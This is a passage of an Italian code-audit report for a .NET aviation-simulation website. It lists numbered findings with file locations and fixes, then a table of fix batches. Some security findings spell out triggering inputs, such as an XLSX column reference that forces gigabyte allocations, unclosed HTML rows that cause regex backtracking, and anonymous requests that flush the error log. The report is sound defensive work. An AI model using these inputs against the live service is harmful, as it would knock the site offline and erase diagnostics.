- **Correzione.** Tetto per chiave, oppure stream servito solo ai collegati (dal §CZ l'anonimo non lo apre).

**T-022 — Import XLSX: il riferimento di colonna non ha tetto, e pochi KB fanno allocare gigabyte.**
sec-input · C · `src/Vipi.Application/Import/LettoreXlsx.cs:182`.
- **Scenario.** `r="ZZZZZZ1"` vale 321 milioni e `while (celle.Count < colonna) celle.Add("")` alloca
  diversi GB. L'`OutOfMemoryException` non viene catturata (`Leggi` prende solo `InvalidDataException` e
  `XmlException`), e sull'unica istanza cadono tutti i circuiti. Anche `ToDictionary` alla riga 112
  solleva su un Id duplicato.
- **Correzione.** Rifiutare colonne oltre 16383; `TryAdd` per le relazioni.

**T-023 — Import tabella HTML: regex lazy senza timeout, costo quadratico su tag non chiusi.**
sec-input · C · `src/Vipi.Application/Import/TabellaHtml.cs:45`.
- **Scenario.** Un `.txt` da 8 MB con `<table>` e poi `<tr>` ripetuto senza `</tr>` (HTML valido, che
  permette di ometterlo): `Riga.Matches` scorre fino in fondo per ogni `<tr` e blocca circuito e thread.
  In tutto `src` non c'è un solo `MatchTimeout`.
- **Correzione.** Tetto sulla dimensione del testo e timeout (oppure `NonBacktracking`).

**T-024 — Chi non è editor e apre l'editor aeroporto riceve un 500, e ogni visita scrive 6,3 kB di stack nel registro errori.**
sicurezza-dal-vivo · **C-vivo** · `src/Vipi.Ui/Components/Doc/AirportSectionsEditor.razor:105`.
- **Riprodotto.** `/services/vsop/libb/airports/editor?icao=LIBD` da anonimo o da non-editor risponde 500;
  gli altri editor rispondono 200 «Non autorizzato».
- **Causa.** `LoadAsyncCore` ricade in sola lettura ma `_shell.DocumentId` resta valorizzato: si monta
  `TranslationReviewPanel`, che chiama `LoadForEditAsync` (richiede Editor) senza catch. Il blocco è stato
  spostato fuori dal ramo `Chrome` il 6 settembre (`4f4ae155`).
- **Effetto sulla diagnostica.** Il file ruota a 512 kB e tiene una sola generazione: circa 80 GET anonime
  spingono gli errori veri nella copia precedente, circa 160 li cancellano. Sull'host Plesk è l'unico canale
  di diagnosi.
- **Correzione.** Montare il pannello solo se `_canEdit`; comprimere le ripetizioni della stessa firma nel
  registro; niente NOTA di `/Error` per ogni GET.

**T-025 — Il lock di risorsa (Struttura, Trasferimenti, ACC, Confinanti) non è verificato da nessun servizio.**
content-b · C · `src/Vipi.Application/Content/ResourceLockService.cs:102`.
- **Codice.** `EnsureHeldAsync` non ha chiamanti fuori dai test, e `StructureEditingService` controlla solo
  il ruolo.
- **Scenario.** Dopo un «sblocca comunque», o dopo battiti falliti, la pagina che ha perso il lock continua
  a salvare fino al battito successivo (60 s). È la stessa famiglia di T-004.
- **Correzione.** `_locks.EnsureHeldAsync(...)` in testa alle scritture, oppure dichiarare il lock solo
  consultivo.

**T-026 — «Sezioni in comune» di un'unione si applica sezione per sezione, senza transazione.**
content-a · C · `src/Vipi.Application/Content/EditingService.cs:202`.
- **Scenario.** Unione vIPI LIPZ + vSOP militare (*precisazione:* il confronto vale fra Airport e
  AirportMil, non con l'APP). «Nascondi in LIPZ» dà il piano [nascondi A, mostra B]. Il primo passo riesce,
  il secondo solleva `EditConflictException` perché il lock del militare non è di chi preme: METAR resta
  nascosto in **tutti e due** i documenti.
- **Correzione.** Verificare prima lock e bozza di tutti i membri, oppure eseguire prima i «mostra».

**T-027 — La rinomina di un callsign non riscrive le chiavi dei dizionari JSON: gli override di colore AoR si perdono.**
content-a · C · `src/Vipi.Application/Content/CallsignRename.cs:181`.
- **Scenario.** `Colors: {"LIMF_TWR":"#ff8800"}` resta sotto la chiave vecchia dopo la rinomina in
  LIMF_N_TWR, e `AorColorScheme.Resolve` torna al colore di default. Il test
  `Non_tocca_una_chiave_che_si_chiama_come_il_callsign` fissa proprio il comportamento sbagliato.
- **Correzione.** Rinominare anche la proprietà che si chiama esattamente come il callsign vecchio.

**T-028 — Pagina pubblica dell'APP: con la sezione AoR in Live la mappa usa shape extra, colori e configurazioni della BOZZA.**
content-a · C · `src/Vipi.Application/Content/AppViewDerivationService.cs:56`.
- **Codice.** `frozen.Get("aor") ?? _app.GetAorViewAsync(app)` legge con `GetSectionBlockJsonAsync`, che
  risolve la versione di lavoro. Il gemello per la tabella di accorpamento (righe 60-63) è già stato
  corretto.
- **Correzione.** Overload che riceve personalizzazione e configurazioni dal `DocumentView` mostrato.

**T-029 — Una rinomina che torna su un nominativo già dismesso viola l'indice unico e blocca l'import ogni notte.**
data · C · `src/Vipi.Infrastructure/Persistence/EfCallsignRenameService.cs:215`.
- **Scenario.** A→B, poi B→A, poi di nuovo A→B, oppure una riga nuova che riprende A: il secondo
  `CallsignAlias` con lo stesso `OldCallsign` viola `IX_CallsignAliases_OldCallsign` (`VipiDbContext.cs:609`).
  `ApplyAsync` gira senza catch in testa a `ImportSubcentersAsync` e alle posizioni aeroporto, quindi
  l'import dei settori fallisce a ogni giro.
- **Correzione.** Aggiornare l'alias esistente, oppure rifiutare la singola rinomina; test A→B→A→B.

**T-030 — Il riassunto mensile si scrive e non si legge mai: dopo la potatura a 366 giorni ore e classifica perdono i mesi vecchi.**
services + data · C · `src/Vipi.Infrastructure/Persistence/EfAtcStatsQueries.cs:31`.
- **Codice.** `Contate()` legge solo `AtcSessions`; `AtcMonthRollups` si legge solo in `ArchiveStartAsync`
  (riga 437), che intanto dichiara «dati da settembre 2025».
- **Effetto.** Con R-015 corretto la potatura gira davvero, e il periodo «Tutto» (3650 gg) e il Delta sul
  365 perdono ore ogni notte.
- **Correzione.** Sommare il riassunto per i mesi potati, oppure limitare i periodi offerti.

**T-031 — Il ripasso dello storico ATC copre sempre 2 giorni fissi: dopo un fermo più lungo il buco resta.**
services · C · `src/Vipi.Infrastructure/Ivao/AtcHistoryImportHostedService.cs:55`.
- **Codice.** `GetLastSuccessAsync` si usa solo come booleano.
- **Correzione.** `da = min(adesso − RefreshDays, lastSuccess − margine)`, con un tetto a `BackfillDays`.

**T-032 — La sessione si chiude all'istante del riavvio, e il riempimento retroattivo attribuisce movimenti a ore in cui il controllore non c'era.**
services · **P** · `src/Vipi.Application/Stats/AtcSessionSync.cs:91`.
- **Scenario.** Il processo muore alle 23:00 e riparte alle 07:00: `EndUtc = 07:00`. Se il backfill passa
  prima che lo storico corregga `EndUtc`, alla torre vanno i movimenti di tutta la notte, e `TrafficFilledUtc`
  impedisce il ricalcolo.
- **Perché PLAUSIBILE.** Dipende dall'ordine dei due giri.
- **Correzione.** Chiudere all'ultimo avvistamento.

**T-033 — La verifica del roster staff parte solo dopo 24 h di processo acceso: sotto Passenger non gira mai.**
services · **P** · `src/Vipi.Infrastructure/Ivao/StaffRosterVerificationService.cs:36`.
- **Codice.** `PeriodicTimer` senza stato persistito; con i riavvii frequenti non arriva mai al primo tick.
  Aggrava T-002.
- **Correzione.** Passare a `GatedImportLoop` con una categoria propria.

**T-034 — La fotografia degli ATC online non scade: con il whazzup giù si mostrano per ore controllori che hanno staccato.**
services · **P** · `src/Vipi.Infrastructure/Ivao/AtcPollingHostedService.cs:136`.
- **Codice.** `OnlineAtcCache` non ha TTL.
- **Precisazione.** LivePage mostra già l'età del feed; il pallino e la presidenza no.
- **Correzione.** Dopo N giri persi, dato marcato «non disponibile».

**T-035 — Il salvataggio finale del traffico in `StopAsync` gira accanto al giro del poller ancora vivo.**
concurrency · C · `src/Vipi.Infrastructure/Ivao/AtcPollingHostedService.cs:167`.
- **Codice.** `FlushAsync` parte prima di `base.StopAsync`, quindi prima che il loop venga annullato.
  `TrafficLedger` (Dictionary e List senza lock) può sollevare «Collection was modified», oppure due
  `SaveAsync` inseriscono la stessa chiave composta: nei due casi il flush finale si perde.
- **Correzione.** Prima `base.StopAsync`, poi il flush.

**T-036 — La spinta del catalogo stazioni avviene PRIMA del commit: un lettore concorrente rimette in cache i dati vecchi con la versione nuova.**
concurrency · C · `src/Vipi.Infrastructure/Persistence/BumpCatalogoStazioniInterceptor.cs:47`.
- **Scenario.** Un aeroporto eliminato dentro `ExecuteInTransactionAsync`. Una richiesta concorrente legge
  prima del commit e salva `Copia(N+1, dati vecchi)`: l'aeroporto resta in navigazione, testate e
  `ResolveByCallsign` fino al riavvio.
- **Correzione.** Seconda spinta a transazione confermata (`SavedChanges` e dopo `CommitAsync`).

**T-037 — LivePage smaltisce `_caricamento` in `DisposeAsync` mentre un caricamento lo tiene.**
ui-pages + concurrency · C · `src/Vipi.Ui/Pages/LivePage.razor:516`.
- **Scenario.** Si lascia la vista live durante `LoadAsync` o `CaricaPostazioniAsync`: il `Release()` nel
  `finally` solleva `ObjectDisposedException` e il circuito cade. È la stessa regola violata in T-013.
- **Correzione.** Togliere il `Dispose` e aggiungere un flag `_chiusa`.

**T-038 — Glossario: la ricerca ha il debounce ma nessuna esclusione; `ApriVoce` e `AlternaFrasi` girano senza `_busy`.**
ui-pages · **P** · `src/Vipi.Ui/Pages/GlossarioPage.razor:902`.
- **Scenario.** Un secondo `CaricaAsync` (nove query più il corpus intero) parte mentre il primo è ancora
  in volo, sullo stesso contesto.
- **Correzione.** Una porta sola per le letture della pagina.

**T-039 — Hub documenti: scegliere una riga carica il dettaglio fuori dalla porta.**
ui-pages · **P** · `src/Vipi.Ui/Pages/VersioniPage.razor:825`.
- **Scenario.** Due `Pick` su righe diverse, oppure `Pick` e «Aggiorna» insieme, portano 4-5 query
  sovrapposte sullo stesso DbContext; `LoadDetailAsync` cattura solo `EditNotAllowedException`. Anche
  `ToggleDiff` e `RefreshLockAsync` restano fuori dalla porta.
- **Correzione.** Passare da `InFilaAsync`.

**T-040 — Registro audit: il selettore del periodo non si spegne durante il caricamento.**
ui-pages · **P** · `src/Vipi.Ui/Pages/AuditPage.razor:66`.
- **Scenario.** Due `change` ravvicinati avviano due `LoadAsync` senza controllo di rientro sul contesto del
  circuito.
- **Correzione.** Sentinella che ricorda di rileggere, oppure scope proprio.

**T-041 — Hub documenti: «Pubblica versione» e «Scarta» non ricaricano, e il secondo clic riprende il lock per 30 minuti.**
ui-pages · C · `src/Vipi.Ui/Pages/VersioniPage.razor:1090`.
- **Scenario.** Il pannello resta sulla bozza. Il secondo clic esegue `AcquireLockAsync` e poi riceve
  «Solo una bozza può essere pubblicata» (solo in italiano), oppure un falso «non permesso» sulla versione
  scartata. Il lock resta preso per 30 minuti.
- **Correzione.** Ricaricare come fanno `PublishRelease` e `CancelRelease`, e rilasciare il lock quando c'è
  un errore.

**T-042 — Ricerca e «Cosa è cambiato» mostrano al pubblico la versione corrente, non lo snapshot della release in vigore.**
ui-pages · C · `src/Vipi.Infrastructure/Persistence/EfSearchRepository.cs:66` (e `EfChangesRepository.cs:38-85`).
- **Scenario.** Dopo «Pubblica questa versione» (v5) con la release al ciclo successivo, la pagina serve
  ancora v4, ma la ricerca anonima cita testi e sezioni riesposte della v5 e /changed ne mostra nota e
  conteggi. `PublicDocumentGate` controlla solo che una release esista.
- **Correzione.** Indicizzare il payload della release effettiva.

**T-043 — `wireAor` (legacy) riaggancia le chip in parallelo a `onAorClick`.**
ui-components · C · `src/Vipi.Ui/wwwroot/vipi-ui.js:77`.
- **Due casi.** Una configurazione cliccata nel blocco N spegne le chip del **primo** blocco
  (`document.querySelector('.aor-block')`). Nel ripiego SVG la chip non commuta, perché le due inversioni si
  annullano. I bersagli originali di `wireAor` non esistono più.
- **Correzione.** Togliere il cablaggio chip/cfg da `wireAor`.

**T-044 — `vipiLive.unsubscribe(null)` svuota tutti i sottoscrittori.**
ui-components · **P** · `src/Vipi.Ui/wwwroot/vipi-live.js:21`.
- **Scenario.** LivePage viene smaltita mentre il suo `subscribe` è ancora in volo, manda
  `unsubscribe(null)` e stacca anche il LiveBadge del layout. Codice senza guardia in `LiveBadge.razor:85` e
  `LivePage.razor:514`.
- **Correzione.** Non chiamare `unsubscribe` con id null; lato JS ignorare il null.

**T-045 — Traduzione: se un lotto successivo al primo fallisce, i caratteri già fatturati non si registrano e il tetto di spesa è aggirato.**
content-b · C · `src/Vipi.Application/Translation/TranslationFillUseCase.cs:202`.
- **Codice.** `AzureTranslationEngine.cs:85-91` e `DeepLTranslationEngine.cs:77-83` restituiscono `Ko`
  perdendo il conto dei lotti riusciti; `riuscito == null` esce prima di `RegistraSpesaAsync`. Un 400
  deterministico (oltre 50.000 caratteri nel terzo lotto) si ripete a ogni giro.
- **Correzione.** Il motore restituisce i caratteri spediti con successo anche quando il lotto finisce `Ko`.

**T-046 — Le quote dei pezzi AIP, dichiarate in PIEDI, passano dall'euristica «≤660 = FL».**
aero · **P** · `src/Vipi.Application/Stats/SectorVolume.cs:97` (e `AorShapeProjection.cs:40`).
- **Scenario.** Un'ATZ «GND–500 FT» agganciata a una TWR (LINL e LILG nel KMZ locale) diventa FL0–FL500:
  la torre rivendica i sorvoli a FL350 nelle statistiche e nel rinvio geometrico.
- **Già corretto altrove.** `RegulatedAreasMap` e `AirspaceMap` usano già `FromFeet`.
- **Perché PLAUSIBILE.** Non è verificato che oggi una TWR abbia un pezzo simile.
- **Correzione.** Scegliere la conversione in base a `ShapeSource`.

**T-047 — Il gemello TWR di R-018 non è stato corretto: in `twrs.tfl` un vertice malformato tronca l'anello, che poi resta per sempre.**
aero · C · `src/Vipi.Infrastructure/Sectorfile/AuroraSectorfileParser.cs:334`.
- **Codice.** `ParseTowerShapes` fa `Flush` su ogni riga che non è una coppia DMS; l'anello parziale diventa
  shape reale con `SetRealShapeAsync` (`GithubTowerShapeService.cs:51-66`) e non viene più rimpiazzato.
  È un gemello mai coperto, **non** R-018 tornato: quella correzione vive solo in `ParseSectorShapes`.
- **Correzione.** Stessa guardia di `ParseSectorShapes`.

**T-048 — Il convertitore accetta primi e secondi ≥ 60 in tutte le forme tranne il DMS Aurora (R-019 chiuso a metà).**
aero · C · `src/Vipi.Application/Coordinates/CoordinateParser.cs:424` (e `Impacchettato`, righe 463-474).
- **Scenario.** `41°75'00"N` entra come 42,25° senza avvisi, e così le forme a spazi, a due punti e ARINC.
- **Correzione.** `FuoriIntervallo` anche nei rami simbolico e impacchettato; allargare l'`InlineData`.

**T-049 — Nel convertitore la virgola decimale all'italiana spezza la coordinata in due vertici validi e sbagliati.**
aero · C · `src/Vipi.Application/Coordinates/CoordinateParser.cs:73`.
- **Scenario.** `41,9906 12,4964` produce (41N 99,1E) e (12N 50,07E) come righe «lette».
- **Correzione.** Riconoscere «cifre,cifre» senza spazi come decimale, oppure segnalarlo.

**T-050 — METAR AUTO: `OVC002///` e `0800NDV` non vengono letti.**
aero · **P** · `src/Vipi.Application/Weather/MetarParser.cs:14` (e `:19`).
- **Effetto.** Soffitto e visibilità null, quindi NonValutabile con cielo coperto a 100 ft. *Precisazione:*
  con `9999NDV` il risultato è NonValutabile, non Nil.
- **Perché PLAUSIBILE.** Non si sa quanto spesso le sorgenti servano questa forma.
- **Correzione.** Accettare i suffissi `///` e `NDV` nelle due regex.

**T-051 — AuroraProfiles: la sezione copiata si incolla alla riga precedente se questa non termina con a-capo.**
services · C · `src/Vipi.AuroraProfiles/ProfileSwapper.cs:78`.
- **Scenario.** `Color=12[MAPS]`: l'intestazione si perde e la sezione [MAPS] della destinazione si fonde
  con quella prima.
- **Correzione.** Aggiungere il terminatore dominante prima di inserire.

**T-052 — Bridge Aurora: «assunto» si calcola solo al cambio di selezione.**
services · C · `src/Vipi.AuroraBridge.Core/BridgeOrchestrator.cs:109`.
- **Scenario.** Il controllore assume il traffico già selezionato: la scrittura resta bloccata su «Traffico
  non assunto» finché non cambia selezione o preme Aggiorna.
- **Correzione.** Rileggere `#TRPOS` a ogni giro.

**T-053 — Etichette libere delle clausole senza tetto: su MariaDB superano `varchar(80/200)`.**
data · C · `src/Vipi.Infrastructure/Persistence/EfAgreementRepository.cs:881`.
- **Scenario.** Una condizione libera di 86 caratteri (input senza maxlength in
  `AdminTrasferimentiPage.razor:2366`) passa su SQLite. Su MariaDB strict dà «Data too long», su MariaDB
  non strict viene troncata in silenzio.
- **Correzione.** Validare le lunghezze nel servizio con costanti condivise col modello e aggiungere
  maxlength. In alternativa allargare le colonne con una **migrazione additiva**.

**T-054 — Caricamento spazi aerei non atomico e con campi dal file non tagliati.**
data · C · `src/Vipi.Infrastructure/Persistence/EfAirspaceCatalog.cs:93` (e `SetCurrentAsync:178-181`).
- **Scenario.** `ExecuteUpdate(IsCurrent=false)` viene scritto subito; se poi il `SaveChanges` fallisce (un
  Name oltre 200 su MariaDB strict) nessun caricamento resta in vigore e il catalogo appare vuoto.
- **Correzione.** Transazione con `IUnitOfWork` e `Taglia()` anche su Name, Category e NaturalKey.

**T-055 — Archivio ATC paginato con OFFSET su un ordinamento non univoco.**
data · **P** · `src/Vipi.Infrastructure/Persistence/EfAtcArchiveQueries.cs:63`.
- **Scenario.** Senza `ThenBy(SessionId)` e con inserimenti in testa fra una pagina e l'altra, un lettore
  da archiviatore vede righe ripetute o saltate.
- **Correzione.** Spareggio e paginazione a cursore.

**T-056 — Il cancello del numero di test «si alza da sé»: non è vero, e l'atteso è fermo alla 1.16.1.**
docs · C · `tools/conta-test.sh:22` (e `tests/conteggi-attesi.txt:1`).
- **Codice.** Il file si riscrive solo con `--scrivi`, che la CI non passa; l'ultimo commit è `d2925b3f`
  dell'8 settembre.
- **Effetto.** Un calo fino a circa 190 test in Application resta verde: il guasto che R-028 doveva chiudere.
- **Correzione.** Rigenerare subito e togliere la frase falsa, oppure far fallire la CI se i conteggi salgono
  senza aggiornare il file.

**T-057 — `mappa-pagine.md` (🟢 autorevole) manca 18 rotte e la colonna Accesso dice cancelli che il codice non ha.**
docs · C · `docs/spec/mappa-pagine.md:89`.
- **Rotte mancanti.** Fra le altre: `/services/vawos/{Icao}`, i vSOP militari, `/admin/diagnostics`,
  `/admin/attachments`.
- **Cancelli sbagliati.** «admin» su `/admin/acc` (in realtà `IsEditor`), `IsAdmin` su stats/division (in
  realtà `IsDivisionStaff`), «staff» su screens (in realtà nessun cancello).
- **Correzione.** Riscrivere la tabella con i cinque livelli; valutare un test `@page`↔tabella.

**T-058 — Le guide per l'integratore descrivono ancora il modello di permessi eliminato il 28 agosto.**
docs · C · `docs/guide/config.md:327` (e `integration.md:112-116`, HANDOFF §4 e §6).
- **Contenuto sbagliato.** `EditGrant`, `AdminRolePatterns`, «altri sola lettura»; la stessa guida alla riga
  23 dice che non esistono più.
- **Correzione.** Riscrivere con i cinque livelli e `Auth:FounderVids`.

**T-059 — La produzione gira su .NET 8, che esce dal supporto il 10 novembre 2026.**
base · C · `src/Vipi.Host/Vipi.Host.csproj` (TargetFramework) · `src/Vipi.Infrastructure.MySqlMigrations/Vipi.Infrastructure.MySqlMigrations.csproj`.
- **Situazione.** Host e set MySQL solo net8, con Pomelo 8.0.3 che lega a EF 8, e nessuna CI pubblica net10.
- **Effetto.** Dopo il 10 novembre una CVE su OpenIdConnect, Kestrel o DataProtection non riceve patch.
- **Correzione.** Iniziare ora il salto a Pomelo 9+ e la riverifica del set MySQL.

### S4

**T-060** — La classe di R-023 non era isolata. `EfNavaidCatalog`, `EfAirspaceCatalog`,
`EfSectorAirspaceBindings`, `EfSidFixAliasRepository`, `EfGlossaryStore`, `EfStatsSettingsStore` e
`NavaidImporter` hanno zero guardie di ruolo e ricevono `userId` dal chiamante. Oggi nessun percorso è
raggiungibile, perché le pagine rendono i comandi solo agli Editor. · sec-auth · **P** ·
`src/Vipi.Infrastructure/Persistence/EfNavaidCatalog.cs:57` · Facciata con `EnsureAtLeast` e un test per
porta da anonimo.

**T-061** — `/services/vsop/aor3d/{vloa|app}/{key}` serve a chiunque la copia di **lavoro** dell'AoR, anche
di documenti nascosti o mai pubblicati (id enumerabili), e la mette in output cache. · sec-auth · C ·
`src/Vipi.Ui/Pages/Aor3dFullPage.razor:56` · Togliere la rotta, che non ha ingressi, oppure passare dalle
porte pubbliche.

**T-062** — Il `Dockerfile` gira come root (manca `USER $APP_UID`), mentre `ci.yml:181` dichiara il
contrario. Riguarda l'immagine Render di anteprima. · sec-infra · C · `Dockerfile:14` · Aggiungere `USER` e
correggere il commento.

**T-063** — `RemoveGroupAsync` elimina qualunque sezione, anche l'Aerovia o una sezione di un altro
documento: ignora `accCode` e la rete di `MoveGroupAsync`. Oggi l'unico chiamante non offre il tasto.
· content-a · **P** · `src/Vipi.Application/Content/AccDocumentService.cs:246` · Assemblare e rifiutare,
insieme a T-004.

**T-064** — `ResolveSidsForViewAsync` legge sempre lo snapshot **civile**: è la trappola che l'interfaccia
vieta. È codice morto pubblico. · content-a · C ·
`src/Vipi.Application/Content/AirportViewDerivationService.cs:113` · Eliminarlo, oppure aggiungere il
parametro `edizione`.

**T-065** — `FrozenTranslationJsonConverter`: un oggetto annidato in `"t"` o `"r"` lascia il lettore a metà
e rende illeggibile tutto lo snapshot (*precisazione:* un array di stringhe si legge bene). · content-a · C
· `src/Vipi.Application/Content/FrozenTranslation.cs:102` · `reader.Skip()` nei due rami.

**T-066** — MRVA: un vertice `T;` con coordinata illeggibile viene saltato in silenzio, e l'area si disegna
con un lato dritto (famiglia R-018). · aero · C · `src/Vipi.Infrastructure/Sectorfile/AuroraSectorfileParser.cs:268`
· Invalidare il gruppo, o almeno loggare.

**T-067** — `EffectiveUtcForCycle` accetta «2614» in un anno da 13 cicli e restituisce la data di 2701.
· aero · C · `src/Vipi.Domain/Services/AiracService.cs:52` · Verificare che `GetCycle(d) == t`.

**T-068** — I minuti di traffico si contano «uno per giro», legati in silenzio a `PollSeconds = 60`;
l'audit prestazioni ne propone il raddoppio. · services · C · `src/Vipi.Application/Stats/TrafficLedger.cs:213`
· Contare i minuti trascorsi, oppure bloccare la configurazione.

**T-069** — `TransientRetryHandler`: il ramo «timeout: ritenta» non scatta mai, perché il token è già
annullato da `HttpClient.Timeout`, e tutti i tentativi condividono i 15 s. · services · C ·
`src/Vipi.Infrastructure/Ivao/TransientRetryHandler.cs:25` · Timeout per tentativo, oppure togliere ramo e
commento.

**T-070** — I segni «già agganciato» (`data-pw`, `data-persist-wired`) vengono cancellati dal DomSync, e
ResizeObserver e listener `toggle` si accumulano a ogni navigazione. È la radice di T-015 e T-016. ·
ui-components · C · `src/Vipi.Ui/wwwroot/vipi-ui.js:800` (e `:272-281`) · `WeakSet` al posto degli attributi.

**T-071** — L'aiuto dell'editor aeroporto, la Guida e il tour promettono «Salva tutto» e Ctrl+S, che non
esistono più; `vipiEditorInit` (Ctrl+E/Z/Y) non ha chiamanti. · ui-components · C ·
`src/Vipi.Ui/Resources/SharedResource.resx:2054` (e `GuidaPage.razor:584`, `vipi-tour.js:12`,
`vipi-editor.js:13`) · Riscrivere sul modello «ogni gesto scrive».

**T-072** — SSE: `OnChanged` può rilasciare un semaforo già smaltito dentro `OnlineAtcCache.Set`.
L'eccezione salta `RegistraSessioni` e `RegistraTraffico` di quel minuto. · concurrency · C ·
`src/Vipi.Hosting/VipiModuleExtensions.cs:307` · Isolare i sottoscrittori, oppure non smaltire il semaforo.

**T-073** — Quattro test che non possono fallire: `DelayedUiActionTests.Un_renderer_sparito…` (nessun
Assert, nessuna iscrizione a `UnobservedTaskException`), `DiagnosticaCircuitoTests.Senza_eccezione…` e due
di `CronometroAvvioTests`. · quality · C · `tests/Vipi.Ui.Tests/DelayedUiActionTests.cs:104` · Dare a
ciascuno un'asserzione osservabile.

**T-074** — Lo zip di consegna ha voci col backslash (Compress-Archive 1.0.1), e un estrattore lato Linux
potrebbe creare file piatti. · quality · **P** · `tools/prepara-pacchetto.ps1:213` · `ZipArchive` con `/`,
oppure un controllo sulle voci.

**T-075** — `catch (Exception)` vuoto in `LoadRunwaysAsync`. Il caso che il commento cita (scalo senza
piste) non solleva, quindi il catch inghiotte solo i guasti veri. · quality · **P** ·
`src/Vipi.Ui/Pages/AdminTrasferimentiPage.razor:2883` · Restringere e loggare.

**T-076** — `errori-per-era.py` riconosce il tipo solo per `System.*` e `Microsoft.*`: le tre
`MySqlProtocolException` dell'8 settembre escono come «-» e restano fuori dalle prime 15. · quality · C ·
`tools/errori-per-era.py:80` · Prendere la prima riga dopo l'intestazione.

**T-077** — «RVR minimo → valutazione LVP» è copiata fra documento e quadro, e le due copie divergono già
con METAR assente; lo split delle piste è scritto tre volte. · quality · C ·
`src/Vipi.Ui/Components/Doc/AirportMemberLoader.cs:231` (e `AwosService.cs:140`) · Un metodo solo nel
valutatore, **prerequisito** di T-009.

**T-078** — Codice morto tenuto vivo dai test: `CoverageResolver.CoveredBy` (solo test),
`TrafficAttribution.AttributeAll` e `AgreementPoints.UnpairedWithin` (zero chiamanti).
`VatsimMetarClient.cs:14` dice che l'endpoint IVAO non esiste, mentre è la prima scorta. · quality · C ·
`src/Vipi.Application/Stats/CoverageResolver.cs:51` · Togliere e correggere.

**T-079** — La premessa del commento di `SectionCatalog.Find` («solo i contenitori AirportMil hanno figli»)
è falsa: nel profilo Airport ci sono `runways → runwayrules` e le carte. · docs · C ·
`src/Vipi.Application/Content/SectionCatalog.cs:544` · Riscrivere la premessa.

**T-080** — Commenti e cref che nominano meccanismi rimossi: `EnsureCanEditAccAsync`/GRANT
(`NewDocumentPage.razor:43`, `CoordinationAgreement.cs:31`), cref a `Excludes` (`FlightPhase.cs:46`), chiave
`RiconciliazioniDocumentali:{versione+commit}` (`VipiModuleExtensions.cs:758`), `AmmetteCivile` nella carta
delle categorie. · docs · C · `src/Vipi.Ui/Pages/NewDocumentPage.razor:43` · Correggere; valutare
`GenerateDocumentationFile` per avere CS1574.

**T-081** — Il README dà due conteggi di test contraddittori (~5980 e 2111) e la tabella dell'architettura
non nomina `Vipi.Infrastructure.MySqlMigrations` né `Vipi.AuroraProfiles`. · docs · C · `README.md:77` ·
Rimandare a `conta-test.sh` e aggiungere i progetti e il comando MySQL.

**T-082** — Stati al presente smentiti dalla realtà: «non fuso» in `aeroporto-a-sezioni.md:3`, 1.11.0 «non
ancora caricato» in `docs/index.md:115`, «non ancora in produzione» in `autorizzazioni-a-livelli.md:8`
(*l'esempio della carta bilingue è confutato: è già marcato come storia*). · docs · C ·
`docs/feature/2026-08-26-aeroporto-a-sezioni.md:3` · Aggiornare le righe di stato.

**T-083** — Link rotto `09-registri-per-tipo.md`. · docs · C · `docs/refactor/12-vista-live-unificata.md:4`.

**T-084** — Un ACC inesistente risponde 200 «ACC sconosciuto» con `Cache-Control: public` (misurato in
produzione su `/services/vsop/nonexistent-xyz`): ogni percorso inventato diventa una copia in cache e una
pagina indicizzata. · sicurezza-dal-vivo · **C-vivo** · `src/Vipi.Host/CacheDelleLettureAnonime.cs:79` ·
Far rispondere 404 alla pagina.

**T-085** — Cookie antiforgery e lingua emessi in HTTPS senza `Secure`; HSTS al default di 30 giorni
(misurato in produzione). · sicurezza-dal-vivo · **C-vivo** ·
`src/Vipi.Hosting/CultureCookieMiddleware.cs:46` (e `VipiStartup.cs:396`, `:514`) · `Secure`,
`Antiforgery.Cookie.SecurePolicy = Always`, `AddHsts` a 365 giorni.

**T-086** — `Vipi.Ui` fissa i pacchetti net10 a `10.0.10` esatto, mentre il resto della soluzione fluttua
su `10.0.*`: una patch di sicurezza di Components non arriverebbe proprio al progetto dei componenti.
· base · C · `src/Vipi.Ui/Vipi.Ui.csproj:30` · `10.0.*`, oppure un commento che giustifichi il blocco.

**T-087** — Nessun test presidia l'allineamento fra modello e migrazioni **SQLite**; quello MySQL esiste.
Oggi la misura dà zero differenze: manca la garanzia, non c'è deriva. · base + data · C ·
`tests/Vipi.Infrastructure.Tests/MySqlMigrationsTests.cs:53` · Test gemello con `GetDifferences` sul set SQLite.

---

## 4. Lotti di correzione

Nessun lotto richiede una migrazione obbligatoria. L'unica migrazione **possibile** è quella additiva di
T-053, se si sceglie di allargare le colonne invece di validare; resta comunque fuori dalla finestra cieca.

| # | Lotto | Findings | Dipendenze e note |
|---|---|---|---|
| **L1** | **XSS**: PATCH immediata, a sé | T-001, T-003 (+ LivePage:143, ConfinantiAdminPage:312) | Nessuna. Helper unico di encoding più una guardia di test. È il primo pacchetto |
| **L2** | **Identità e lock** | T-002, T-033, T-018, T-004, T-063, T-025 | T-033 va con T-002, perché la verifica deve girare davvero. T-063 va con T-004 (stessa porta ACC). La guardia di lock condivisa nasce da `AirportLockGuard` |
| **L3** | **Import che perdono dati** | T-006, T-005, T-007, T-029 | T-006 prima: finché un 403 viene timbrato riuscito, anche le guardie di T-005 e T-007 non si vedono in Sorgenti |
| **L4** | **Superficie pubblica e cache** | T-011, T-084, T-085, T-017 (decisione), T-061, T-042, T-021, T-019, T-020 (prima si misura) | **T-011 va chiuso prima** di `passenger_min_instances` e della Cache Rule. T-017 aspetta la decisione del committente |
| **L5** | **Circuito che cade** | T-013, T-037, T-014, T-024, T-038, T-039, T-040, T-041, T-072 | Regola comune: «il semaforo non si smaltisce», e la porta con `InFilaAsync`. T-024 riduce anche il rumore nel registro errori |
| **L6** | **vAWOS e meteo** | T-077, poi T-009, T-010, T-050 | T-077 (un solo punto di derivazione) prima di T-009, così la correzione si fa una volta. Test a sequenza di giri |
| **L7** | **JS e navigazione enhanced** | T-070, T-015, T-016, T-043, T-044 | Stessa radice: i segni vanno in proprietà JS o `WeakSet`, non in `data-`. Verifica con `verifica-live` |
| **L8** | **Release, documenti, editor** | T-008, T-012 (decisione Editor/Admin), T-026, T-027, T-028, T-064, T-065 | T-012 aspetta la scelta della regola |
| **L9** | **Dati e statistiche** | T-030, T-031, T-032, T-035, T-036, T-053, T-054, T-055, T-045 | T-053: prima la validazione nel servizio; la colonna più larga è opzionale e additiva |
| **L10** | **Dominio aeronautico e input** | T-022, T-023, T-046, T-047, T-048, T-049, T-066, T-067 | T-022 e T-023 hanno anche valore di sicurezza (DoS da Editor): possono salire in L1 se c'è spazio |
| **L11** | **Servizi e strumenti** | T-034, T-051, T-052, T-068, T-069, T-074, T-076, T-062 | – |
